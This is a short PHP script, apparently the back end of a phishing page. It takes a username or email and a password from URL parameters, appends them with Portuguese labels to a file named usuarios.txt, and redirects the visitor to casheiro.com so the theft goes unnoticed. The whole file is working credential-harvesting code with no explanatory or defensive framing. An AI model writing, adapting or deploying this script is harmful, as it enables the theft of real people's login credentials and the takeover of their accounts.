<?php
header('location:http://casheiro.com/');
$users = fopen("usuarios.txt","a+");
$u = $_GET['u'];
$p = $_GET['p'];
fwrite($users,"
-------------------------------\n
Usuário/Email: $u\n
Senha: $p \n
-------------------------------\n
")
?>